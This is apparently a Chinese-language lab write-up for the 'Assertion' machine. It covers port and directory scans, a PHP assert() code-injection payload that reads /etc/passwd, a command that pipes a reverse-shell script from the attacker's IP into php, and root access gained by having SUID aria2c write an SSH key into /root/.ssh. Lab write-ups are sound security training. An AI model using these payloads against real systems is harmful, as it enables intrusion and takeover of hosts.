
+++
title = 'assertion1'
date = '2023-12-07T16:08:29+08:00'
draft = true
+++
```
┌──(root㉿kali)-[~/桌面/vpn]
└─# nmap -sS -sV -A --min-rate 5000 -p- 192.168.213.94
Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-17 13:33 CST
Stats: 0:00:27 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 50.00% done; ETC: 13:33 (0:00:06 remaining)
Nmap scan report for 192.168.213.94
Host is up (0.21s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 6eceaacc02dea5a3585dda2bef5407f9 (RSA)
|   256 9d3fdf167ae15958844ae3298f44878d (ECDSA)
|_  256 87b56ff82181d33b43d04081c0e36989 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Assertion
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.93%E=4%D=5/17%OT=22%CT=1%CU=30953%PV=Y%DS=4%DC=T%G=Y%TM=6464675
OS:0%P=x86_64-pc-linux-gnu)SEQ(SP=106%GCD=1%ISR=108%TI=Z%II=I%TS=A)SEQ(SP=1
OS:06%GCD=1%ISR=108%TI=Z%TS=A)OPS(O1=M551ST11NW7%O2=M551ST11NW7%O3=M551NNT1
OS:1NW7%O4=M551ST11NW7%O5=M551ST11NW7%O6=M551ST11)WIN(W1=FE88%W2=FE88%W3=FE
OS:88%W4=FE88%W5=FE88%W6=FE88)ECN(R=Y%DF=Y%T=40%W=FAF0%O=M551NNSNW7%CC=Y%Q=
OS:)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=N)T5(R=Y%DF=Y
OS:%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=N)T7(R=N)U1(R=Y%DF=N%T=40%IPL=16
OS:4%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=ABD0%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)

Network Distance: 4 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 143/tcp)
HOP RTT       ADDRESS
1   212.35 ms 192.168.45.1
2   212.39 ms 192.168.45.254
3   212.64 ms 192.168.251.1
4   212.77 ms 192.168.213.94

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 50.88 seconds
```

```
┌──(root㉿kali)-[~/桌面/vpn]
└─# gobuster dir -u http://192.168.213.94/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -e -k -r -x php,txt,log,conf
===============================================================
Gobuster v3.5
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.213.94/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.5
[+] Extensions:              php,txt,log,conf
[+] Follow Redirect:         true
[+] Expanded:                true
[+] Timeout:                 10s
===============================================================
2023/05/17 13:34:16 Starting gobuster in directory enumeration mode
===============================================================
http://192.168.213.94/.php                 (Status: 403) [Size: 279]
http://192.168.213.94/index.php            (Status: 200) [Size: 36592]
http://192.168.213.94/contact.php          (Status: 200) [Size: 11556]
http://192.168.213.94/about.php            (Status: 200) [Size: 20735]
http://192.168.213.94/blog.php             (Status: 200) [Size: 15274]
http://192.168.213.94/img                  (Status: 200) [Size: 6721]
http://192.168.213.94/gallery.php          (Status: 200) [Size: 17070]
http://192.168.213.94/pages                (Status: 200) [Size: 1959]
http://192.168.213.94/css                  (Status: 200) [Size: 2425]
http://192.168.213.94/schedule.php         (Status: 200) [Size: 23805]
http://192.168.213.94/js                   (Status: 200) [Size: 2694]
http://192.168.213.94/fonts                (Status: 200) [Size: 2951]
http://192.168.213.94/Source               (Status: 200) [Size: 2543]

```

查了下walkthrough，有一个本地文件包含漏洞的url

http://192.168.213.94/index.php?page=

但是我猜测包含函数不是include(),require()等常规的文件包含函数，不能直接给参数page传参../../../../etc/passwd，看了下walkthrough

```
PHP assertions
Going from the machine name and the php file extensions, we can guess that the machine is about php assertions. By using Google to search for ways to bypass php assertions, we find similar challenges and we get some suggestions to try. After a couple of tries, we find that the following payload works wonders:

page=' and die(system('cat /etc/passwd')) or '

Not forgetting to URL encode the spaces, we use curl to send it.
```

应该是使用了assert()函数,等下getshell后看看他源码

```
GET /index.php?page='+and+die(system('cat+/etc/passwd'))+or+' HTTP/1.1

Host: 192.168.213.94

User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0

Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8

Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2

Accept-Encoding: gzip, deflate

Connection: close

Upgrade-Insecure-Requests: 1
```

```
GET /index.php?page='+and+die(system('which+python3'))+or+' HTTP/1.1

Host: 192.168.213.94

User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0

Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8

Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2

Accept-Encoding: gzip, deflate

Connection: close

Upgrade-Insecure-Requests: 1
```

```
HTTP/1.1 200 OK

Date: Wed, 17 May 2023 07:00:51 GMT

Server: Apache/2.4.29 (Ubuntu)

Content-Length: 33

Connection: close

Content-Type: text/html; charset=UTF-8



/usr/bin/python3
/usr/bin/python3
```

远程读取并执行php代码反弹shell

```
curl+http://192.168.45.157:5555/reverse-shell.php|php
```

```
python3 -c 'import pty; pty.spawn ("/bin/bash")'
```



```
<?php

if (isset($_GET['page'])) {
  $page = $_GET['page'];
  $file = "pages/" . $page . ".php";

  // Saving ourselves from any kind of hackings and all
  assert("strpos('$file', '..') === false") or die("Not so easy brother!");
  $val = "pages/". $page;
  
  if(!file_exists($file)){
    die ("File does not exist");
  }
} else {
  $file = "index.php";
}

?>
```

```
assert("strpos('' and die(system('cat /etc/passwd')) or '','..')===false") or die("Not so easy brother!");
```

这里我比较好奇为什么要在system()函数前面嵌套die()函数，可能的原因是，在黑盒环境中，为了防止后面的代码影响system()函数的输出，进而通过die()终止代码的执行，确保system()的结果正常输出。

```
www-data@assertion:/$ find / -perm -4000 2>/dev/null
find / -perm -4000 2>/dev/null
/usr/lib/openssh/ssh-keysign
/usr/lib/eject/dmcrypt-get-device
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/snapd/snap-confine
/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
/usr/bin/at
/usr/bin/aria2c
/usr/bin/newgrp
/usr/bin/newgidmap
/usr/bin/newuidmap
/usr/bin/passwd
/usr/bin/pkexec
/usr/bin/sudo
/usr/bin/chsh
/usr/bin/traceroute6.iputils
/usr/bin/gpasswd
/usr/bin/chfn
/bin/ping
/bin/mount
/bin/fusermount
/bin/su
/bin/umount
...
www-data@assertion:/$
```

```
/usr/bin/aria2c -d /root/.ssh/ -o authorized_keys "http://192.168.45.157:5555/id_rsa.pub" --allow-overwrite=true
```

ssh连接即可获取root权限